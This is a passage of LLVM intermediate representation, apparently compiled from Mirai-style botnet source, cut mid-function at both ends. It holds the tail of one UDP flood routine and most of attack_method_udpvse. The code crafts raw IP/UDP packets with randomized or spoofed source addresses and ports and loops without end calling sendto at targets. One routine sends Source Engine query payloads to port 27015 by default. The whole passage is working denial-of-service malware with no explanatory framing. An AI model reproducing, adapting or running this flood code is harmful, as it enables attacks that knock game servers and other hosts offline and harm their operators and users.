  %106 = load i8, i8* %105, align 4
  %107 = and i8 %106, 15
  %108 = or i8 %107, 64
  store i8 %108, i8* %105, align 4
  %109 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %110 = bitcast %struct.iphdr* %109 to i8*
  %111 = load i8, i8* %110, align 4
  %112 = and i8 %111, -16
  %113 = or i8 %112, 5
  store i8 %113, i8* %110, align 4
  %114 = load i8, i8* %12, align 1
  %115 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i32 0, i32 1
  store i8 %114, i8* %116, align 1
  %117 = load i16, i16* %18, align 2
  %118 = zext i16 %117 to i64
  %119 = add i64 28, %118
  %120 = trunc i64 %119 to i16
  %121 = call zeroext i16 @htons(i16 noundef zeroext %120) #9
  %122 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 2
  store i16 %121, i16* %123, align 2
  %124 = load i16, i16* %13, align 2
  %125 = call zeroext i16 @htons(i16 noundef zeroext %124) #9
  %126 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 3
  store i16 %125, i16* %127, align 4
  %128 = load i8, i8* %14, align 1
  %129 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 5
  store i8 %128, i8* %130, align 4
  %131 = load i8, i8* %15, align 1
  %132 = icmp ne i8 %131, 0
  br i1 %132, label %133, label %137

133:                                              ; preds = %89
  %134 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %135 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 4
  store i16 %134, i16* %136, align 2
  br label %137

137:                                              ; preds = %133, %89
  %138 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 6
  store i8 17, i8* %139, align 1
  %140 = load i32, i32* %20, align 4
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 8
  store i32 %140, i32* %142, align 4
  %143 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i64 %145
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i32 0, i32 1
  %148 = load i32, i32* %147, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 9
  store i32 %148, i32* %150, align 4
  %151 = load i16, i16* %16, align 2
  %152 = call zeroext i16 @htons(i16 noundef zeroext %151) #9
  %153 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %154 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %153, i32 0, i32 0
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %17, align 2
  %156 = call zeroext i16 @htons(i16 noundef zeroext %155) #9
  %157 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %158 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %157, i32 0, i32 1
  store i16 %156, i16* %158, align 2
  %159 = load i16, i16* %18, align 2
  %160 = zext i16 %159 to i64
  %161 = add i64 8, %160
  %162 = trunc i64 %161 to i16
  %163 = call zeroext i16 @htons(i16 noundef zeroext %162) #9
  %164 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %165 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %164, i32 0, i32 2
  store i16 %163, i16* %165, align 2
  br label %166

166:                                              ; preds = %137
  %167 = load i32, i32* %9, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %9, align 4
  br label %84, !llvm.loop !23

169:                                              ; preds = %84
  br label %170

170:                                              ; preds = %310, %169
  store i32 0, i32* %9, align 4
  br label %171

171:                                              ; preds = %307, %170
  %172 = load i32, i32* %9, align 4
  %173 = load i8, i8* %5, align 1
  %174 = zext i8 %173 to i32
  %175 = icmp slt i32 %172, %174
  br i1 %175, label %176, label %310

176:                                              ; preds = %171
  %177 = load i8**, i8*** %11, align 8
  %178 = load i32, i32* %9, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i8*, i8** %177, i64 %179
  %181 = load i8*, i8** %180, align 8
  store i8* %181, i8** %23, align 8
  %182 = load i8*, i8** %23, align 8
  %183 = bitcast i8* %182 to %struct.iphdr*
  store %struct.iphdr* %183, %struct.iphdr** %24, align 8
  %184 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i64 1
  %186 = bitcast %struct.iphdr* %185 to %struct.udphdr*
  store %struct.udphdr* %186, %struct.udphdr** %25, align 8
  %187 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i64 1
  %189 = bitcast %struct.udphdr* %188 to i8*
  store i8* %189, i8** %26, align 8
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 2
  %195 = load i8, i8* %194, align 4
  %196 = zext i8 %195 to i32
  %197 = icmp slt i32 %196, 32
  br i1 %197, label %198, label %219

198:                                              ; preds = %176
  %199 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 4
  %205 = call i32 @ntohl(i32 noundef %204) #9
  %206 = call i32 @rand_next()
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 2
  %212 = load i8, i8* %211, align 4
  %213 = zext i8 %212 to i32
  %214 = lshr i32 %206, %213
  %215 = add i32 %205, %214
  %216 = call i32 @htonl(i32 noundef %215) #9
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  store i32 %216, i32* %218, align 4
  br label %219

219:                                              ; preds = %198, %176
  %220 = load i32, i32* %20, align 4
  %221 = icmp eq i32 %220, -1
  br i1 %221, label %222, label %226

222:                                              ; preds = %219
  %223 = call i32 @rand_next()
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 8
  store i32 %223, i32* %225, align 4
  br label %226

226:                                              ; preds = %222, %219
  %227 = load i16, i16* %13, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  br i1 %229, label %230, label %235

230:                                              ; preds = %226
  %231 = call i32 @rand_next()
  %232 = trunc i32 %231 to i16
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 3
  store i16 %232, i16* %234, align 4
  br label %235

235:                                              ; preds = %230, %226
  %236 = load i16, i16* %16, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  br i1 %238, label %239, label %244

239:                                              ; preds = %235
  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  store i16 %241, i16* %243, align 2
  br label %244

244:                                              ; preds = %239, %235
  %245 = load i16, i16* %17, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  br i1 %247, label %248, label %253

248:                                              ; preds = %244
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 1
  store i16 %250, i16* %252, align 2
  br label %253

253:                                              ; preds = %248, %244
  %254 = load i8, i8* %19, align 1
  %255 = icmp ne i8 %254, 0
  br i1 %255, label %256, label %260

256:                                              ; preds = %253
  %257 = load i8*, i8** %26, align 8
  %258 = load i16, i16* %18, align 2
  %259 = zext i16 %258 to i32
  call void @rand_str(i8* noundef %257, i32 noundef %259)
  br label %260

260:                                              ; preds = %256, %253
  %261 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 7
  store i16 0, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = bitcast %struct.iphdr* %263 to i16*
  %265 = call zeroext i16 @checksum_generic(i16* noundef %264, i32 noundef 20)
  %266 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 7
  store i16 %265, i16* %267, align 2
  %268 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %269 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %268, i32 0, i32 3
  store i16 0, i16* %269, align 2
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %272 = bitcast %struct.udphdr* %271 to i8*
  %273 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i32 0, i32 2
  %275 = load i16, i16* %274, align 2
  %276 = load i16, i16* %18, align 2
  %277 = zext i16 %276 to i64
  %278 = add i64 8, %277
  %279 = trunc i64 %278 to i32
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %270, i8* noundef %272, i16 noundef zeroext %275, i32 noundef %279)
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 %280, i16* %282, align 2
  %283 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 1
  %285 = load i16, i16* %284, align 2
  %286 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %287 = load i32, i32* %9, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 0
  %291 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %290, i32 0, i32 1
  store i16 %285, i16* %291, align 2
  %292 = load i32, i32* %10, align 4
  %293 = load i8*, i8** %23, align 8
  %294 = load i16, i16* %18, align 2
  %295 = zext i16 %294 to i64
  %296 = add i64 28, %295
  %297 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %298 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %299 = load i32, i32* %9, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %298, i64 %300
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i32 0, i32 0
  %303 = bitcast %struct.sockaddr_in* %302 to %struct.sockaddr*
  store %struct.sockaddr* %303, %struct.sockaddr** %297, align 8
  %304 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %305 = load %struct.sockaddr*, %struct.sockaddr** %304, align 8
  %306 = call i64 @sendto(i32 noundef %292, i8* noundef %293, i64 noundef %296, i32 noundef 16384, %struct.sockaddr* %305, i32 noundef 16)
  br label %307

307:                                              ; preds = %260
  %308 = load i32, i32* %9, align 4
  %309 = add nsw i32 %308, 1
  store i32 %309, i32* %9, align 4
  br label %171, !llvm.loop !24

310:                                              ; preds = %171
  br label %170

311:                                              ; preds = %80, %74
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpvse(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 8) #8
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 2, i32 noundef 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 3, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 4, i32 noundef 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 5, i32 noundef 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 noundef zeroext %47, %struct.attack_option* noundef %48, i8 noundef zeroext 6, i32 noundef 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 noundef zeroext %51, %struct.attack_option* noundef %52, i8 noundef zeroext 7, i32 noundef 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 noundef zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 noundef 20, i32* noundef %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #8
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

58:                                               ; preds = %4
  br label %288

59:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 noundef %60, i32 noundef 0, i32 noundef 3, i8* noundef %61, i32 noundef 4) #8
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

64:                                               ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 noundef %65)
  br label %288

67:                                               ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

68:                                               ; preds = %160, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %163

73:                                               ; preds = %68
  %74 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 1) #8
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = and i8 %93, 15
  %95 = or i8 %94, 64
  store i8 %95, i8* %92, align 4
  %96 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = load i8, i8* %97, align 4
  %99 = and i8 %98, -16
  %100 = or i8 %99, 5
  store i8 %100, i8* %97, align 4
  %101 = load i8, i8* %12, align 1
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i32 0, i32 1
  store i8 %101, i8* %103, align 1
  %104 = load i32, i32* %19, align 4
  %105 = sext i32 %104 to i64
  %106 = add i64 32, %105
  %107 = trunc i64 %106 to i16
  %108 = call zeroext i16 @htons(i16 noundef zeroext %107) #9
  %109 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  store i16 %108, i16* %110, align 2
  %111 = load i16, i16* %13, align 2
  %112 = call zeroext i16 @htons(i16 noundef zeroext %111) #9
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 3
  store i16 %112, i16* %114, align 4
  %115 = load i8, i8* %14, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 5
  store i8 %115, i8* %117, align 4
  %118 = load i8, i8* %15, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %124

120:                                              ; preds = %73
  %121 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 4
  store i16 %121, i16* %123, align 2
  br label %124

124:                                              ; preds = %120, %73
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 6
  store i8 17, i8* %126, align 1
  %127 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 8
  store i32 100, i32* %128, align 4
  %129 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i64 %131
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i32 0, i32 1
  %134 = load i32, i32* %133, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 9
  store i32 %134, i32* %136, align 4
  %137 = load i16, i16* %16, align 2
  %138 = call zeroext i16 @htons(i16 noundef zeroext %137) #9
  %139 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %140 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %139, i32 0, i32 0
  store i16 %138, i16* %140, align 2
  %141 = load i16, i16* %17, align 2
  %142 = call zeroext i16 @htons(i16 noundef zeroext %141) #9
  %143 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %144 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %143, i32 0, i32 1
  store i16 %142, i16* %144, align 2
  %145 = load i32, i32* %19, align 4
  %146 = sext i32 %145 to i64
  %147 = add i64 12, %146
  %148 = trunc i64 %147 to i16
  %149 = call zeroext i16 @htons(i16 noundef zeroext %148) #9
  %150 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %151 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %150, i32 0, i32 2
  store i16 %149, i16* %151, align 2
  %152 = load i8*, i8** %22, align 8
  %153 = bitcast i8* %152 to i32*
  store i32 -1, i32* %153, align 4
  %154 = load i8*, i8** %22, align 8
  %155 = getelementptr inbounds i8, i8* %154, i64 4
  store i8* %155, i8** %22, align 8
  %156 = load i8*, i8** %22, align 8
  %157 = load i8*, i8** %18, align 8
  %158 = load i32, i32* %19, align 4
  %159 = call i32 (i8*, i8*, i32, ...) bitcast (void (i8*, i8*, i32)* @util_memcpy to i32 (i8*, i8*, i32, ...)*)(i8* noundef %156, i8* noundef %157, i32 noundef %158)
  br label %160

160:                                              ; preds = %124
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %68, !llvm.loop !25

163:                                              ; preds = %68
  br label %164

164:                                              ; preds = %287, %163
  store i32 0, i32* %9, align 4
  br label %165

165:                                              ; preds = %284, %164
  %166 = load i32, i32* %9, align 4
  %167 = load i8, i8* %5, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp slt i32 %166, %168
  br i1 %169, label %170, label %287

170:                                              ; preds = %165
  %171 = load i8**, i8*** %11, align 8
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8*, i8** %171, i64 %173
  %175 = load i8*, i8** %174, align 8
  store i8* %175, i8** %23, align 8
  %176 = load i8*, i8** %23, align 8
  %177 = bitcast i8* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %24, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %25, align 8
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %187, 32
  br i1 %188, label %189, label %210

189:                                              ; preds = %170
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 noundef %195) #9
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 noundef %206) #9
  %208 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  br label %210

210:                                              ; preds = %189, %170
  %211 = load i16, i16* %13, align 2
  %212 = zext i16 %211 to i32
  %213 = icmp eq i32 %212, 65535
  br i1 %213, label %214, label %219

214:                                              ; preds = %210
  %215 = call i32 @rand_next()
  %216 = trunc i32 %215 to i16
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 3
  store i16 %216, i16* %218, align 4
  br label %219

219:                                              ; preds = %214, %210
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i32
  %222 = icmp eq i32 %221, 65535
  br i1 %222, label %223, label %228

223:                                              ; preds = %219
  %224 = call i32 @rand_next()
  %225 = trunc i32 %224 to i16
  %226 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 2
  br label %228

228:                                              ; preds = %223, %219
  %229 = load i16, i16* %17, align 2
  %230 = zext i16 %229 to i32
  %231 = icmp eq i32 %230, 65535
  br i1 %231, label %232, label %237

232:                                              ; preds = %228
  %233 = call i32 @rand_next()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  br label %237

237:                                              ; preds = %232, %228
  %238 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = bitcast %struct.iphdr* %240 to i16*
  %242 = call zeroext i16 @checksum_generic(i16* noundef %241, i32 noundef 20)
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 7
  store i16 %242, i16* %244, align 2
  %245 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 3
  store i16 0, i16* %246, align 2
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %249 = bitcast %struct.udphdr* %248 to i8*
  %250 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  %252 = load i16, i16* %251, align 2
  %253 = load i32, i32* %19, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 12, %254
  %256 = trunc i64 %255 to i32
  %257 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %247, i8* noundef %249, i16 noundef zeroext %252, i32 noundef %256)
  %258 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 3
  store i16 %257, i16* %259, align 2
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 0
  %268 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %267, i32 0, i32 1
  store i16 %262, i16* %268, align 2
  %269 = load i32, i32* %10, align 4
  %270 = load i8*, i8** %23, align 8
  %271 = load i32, i32* %19, align 4
  %272 = sext i32 %271 to i64
  %273 = add i64 32, %272
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
